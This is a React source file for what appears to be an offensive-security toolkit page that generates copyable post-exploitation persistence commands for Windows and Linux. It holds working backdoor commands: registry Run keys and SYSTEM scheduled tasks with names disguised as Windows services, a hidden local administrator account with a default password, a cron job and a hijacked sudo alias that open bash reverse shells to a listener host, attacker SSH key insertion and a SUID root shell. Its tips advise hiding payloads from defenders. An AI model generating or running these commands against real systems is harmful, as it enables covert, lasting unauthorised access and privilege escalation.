import React, { useState } from 'react';
import { Shield, Terminal, Server, Clock, Key, UserPlus, Database, FileCode } from 'lucide-react';
import { CopyButton } from '../../CopyButtons';
import { ToolPageHeader, SectionCard, FormField, TipsSection } from '../ui';
import { sanitizeCommandArg, sanitizeFilePath } from '../../../utils/validators';

interface PersistenceProps {
    lhost: string;
    rhost: string;
}

type OSType = 'windows' | 'linux';

interface PersistenceMethod {
    id: string;
    label: string;
    icon: React.ReactNode;
    note: string;
    generateCmd: (lhost: string, lport: string, payloadPath: string, adminPass: string) => string;
}

const METHODS: Record<OSType, PersistenceMethod[]> = {
    windows: [
        {
            id: 'reg-run',
            label: 'Registry Run Key',
            icon: <Database className="w-4 h-4 text-purple-400" />,
            note: 'Executes payload every time the user logs in.',
            generateCmd: (_, __, path) => `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdater" /t REG_SZ /d "${path}" /f`
        },
        {
            id: 'schtasks',
            label: 'Scheduled Task (System)',
            icon: <Clock className="w-4 h-4 text-purple-400" />,
            note: 'Creates a task running as SYSTEM (Requires Admin).',
            generateCmd: (_, __, path) => `schtasks /create /ru SYSTEM /sc onstart /tn "SecurityHealthService" /tr "${path}" /f`
        },
        {
            id: 'startup-folder',
            label: 'Startup Folder',
            icon: <FileCode className="w-4 h-4 text-purple-400" />,
            note: 'Drops the payload into the user\'s startup directory.',
            generateCmd: (_, __, path) => `copy "${path}" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Update.exe"`
        },
        {
            id: 'local-admin',
            label: 'Add Local Admin',
            icon: <UserPlus className="w-4 h-4 text-purple-400" />,
            note: 'Creates a hidden user and adds them to Administrators.',
            generateCmd: (_, __, ___, pass) => `net user DefaultAccount$ ${pass || 'ComplexPass123!'} /add /Y & net localgroup administrators DefaultAccount$ /add`
        }
    ],
    linux: [
        {
            id: 'cron-revshell',
            label: 'Cronjob Reverse Shell',
            icon: <Clock className="w-4 h-4 text-purple-400" />,
            note: 'Pings back a bash reverse shell every minute.',
            generateCmd: (lh, lp) => `(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/${lh}/${lp} 0>&1'") | crontab -`
        },
        {
            id: 'ssh-key',
            label: 'SSH Authorized Keys',
            icon: <Key className="w-4 h-4 text-purple-400" />,
            note: 'Adds your public key for passwordless SSH access.',
            generateCmd: () => `mkdir -p ~/.ssh; echo "ssh-rsa AAAAB3NzaC1yc... ATTACKER_PUB_KEY" >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys`
        },
        {
            id: 'bashrc-alias',
            label: 'Bashrc Sudo Alias',
            icon: <Terminal className="w-4 h-4 text-purple-400" />,
            note: 'Intercepts sudo to spawn a background reverse shell.',
            generateCmd: (lh, lp) => `echo 'alias sudo="sudo -S bash -c \\\\"bash -i >& /dev/tcp/${lh}/${lp} 0>&1 &\\\\""' >> ~/.bashrc`
        },
        {
            id: 'suid-backdoor',
            label: 'SUID Bash Backdoor',
            icon: <Shield className="w-4 h-4 text-purple-400" />,
            note: 'WARNING: Unauthenticated SUID backdoor. Any local user can escalate to root.',
            generateCmd: () => `cp /bin/bash /var/tmp/.bash && chmod 4755 /var/tmp/.bash\n# Execute with: /var/tmp/.bash -p`
        }
    ]
};

const TIPS = [
    'Always verify your privileges before attempting system-wide persistence (e.g., HKLM Registry keys or SYSTEM Scheduled Tasks).',
    'Never hardcode default passwords in your backdoors. It opens the target to other threat actors and blue teams.',
    'For Windows, hiding your payload in standard paths like C:\\ProgramData or AppData makes it harder for defenders to spot.',
    'Linux Cronjob reverse shells can be noisy and easily detected by basic blue team monitoring.',
    'Adding users (net user / useradd) is highly visible in event logs. Use it only if stealth is not a priority.',
];

export default function Persistence({ lhost }: PersistenceProps) {
    const [os, setOs] = useState<OSType>('windows');
    const [lport, setLport] = useState('4444');
    const [payloadPath, setPayloadPath] = useState('C:\\ProgramData\\update.exe');
    const [adminPass, setAdminPass] = useState('');

    const effectiveLhost = lhost || '10.10.X.X';

    const handleOsSwitch = (newOs: OSType) => {
        setOs(newOs);
        if (newOs === 'windows') setPayloadPath('C:\\ProgramData\\update.exe');
        else setPayloadPath('/tmp/.hidden_payload');
    };

    // map'e girmeden bir kez sanitize et
    const safeLhost = sanitizeCommandArg(effectiveLhost);
    const safeLport = sanitizeCommandArg(lport);
    const safePayloadPath = sanitizeFilePath(payloadPath, os);
    const safeAdminPass = sanitizeCommandArg(adminPass);

    return (
        <div className="space-y-6">
            <ToolPageHeader
                icon={Shield}
                title="System"
                highlight="Persistence"
                subtitle="BACKDOORS & POST_EXPLOITATION"
                color="purple"
            />

            {/* ── Configuration ── */}
            <SectionCard title="Listener & Payload Config">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <FormField
                        label="Callback Port (LPORT)"
                        value={lport}
                        onChange={e => setLport(e.target.value)}
                        placeholder="4444"
                        color="purple"
                    />
                    <FormField
                        label="Dropped Payload Path"
                        value={payloadPath}
                        onChange={e => setPayloadPath(e.target.value)}
                        placeholder={os === 'windows' ? 'C:\\path\\to\\payload.exe' : '/tmp/payload'}
                        color="purple"
                    />
                    <FormField
                        label="Backdoor Password"
                        value={adminPass}
                        onChange={e => setAdminPass(e.target.value)}
                        placeholder="Set a secure password..."
                        color="purple"
                    />
                </div>
            </SectionCard>

            {/* ── OS Selector ── */}
            <div className="flex bg-slate-900/50 border border-slate-800/50 rounded-xl p-1 w-full max-w-md">
                <button
                    onClick={() => handleOsSwitch('windows')}
                    className={`flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-xs font-bold font-mono transition-all ${os === 'windows'
                        ? 'bg-purple-500/20 text-purple-400 shadow-[0_0_10px_-2px_rgba(168,85,247,0.2)]'
                        : 'text-slate-500 hover:text-slate-300'
                        }`}
                >
                    <Server className="w-4 h-4" /> Windows
                </button>
                <button
                    onClick={() => handleOsSwitch('linux')}
                    className={`flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-xs font-bold font-mono transition-all ${os === 'linux'
                        ? 'bg-purple-500/20 text-purple-400 shadow-[0_0_10px_-2px_rgba(168,85,247,0.2)]'
                        : 'text-slate-500 hover:text-slate-300'
                        }`}
                >
                    <Terminal className="w-4 h-4" /> Linux
                </button>
            </div>

            {/* ── Generated Commands ── */}
            <div className="space-y-4 animate-page-in">
                {METHODS[os].map((method) => {
                    const cmd = method.generateCmd(safeLhost, safeLport, safePayloadPath, safeAdminPass);

                    return (
                        <div key={method.id} className="bg-[#0b0f19] border border-slate-800/50 rounded-xl overflow-hidden group/cmd transition-colors hover:border-purple-500/30">
                            <div className="bg-slate-900/80 px-4 py-3 border-b border-slate-800/60 flex items-center justify-between">
                                <div className="flex items-center gap-2">
                                    {method.icon}
                                    <span className="text-sm font-bold font-mono text-purple-400/90">{method.label}</span>
                                </div>
                                <span className="text-[10px] text-slate-500 font-mono hidden sm:block">{method.note}</span>
                            </div>
                            <div className="p-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
                                <code className="text-xs font-mono text-green-400/90 break-all leading-relaxed whitespace-pre-wrap">
                                    {cmd}
                                </code>
                                <div className="flex-shrink-0 mt-2 sm:mt-0 self-end sm:self-auto">
                                    <CopyButton text={cmd} />
                                </div>
                            </div>
                        </div>
                    );
                })}
            </div>

            {/* ── Tips ── */}
            <TipsSection title="Persistence Tips" tips={TIPS} color="purple" className="mb-6" />
        </div>
    );
}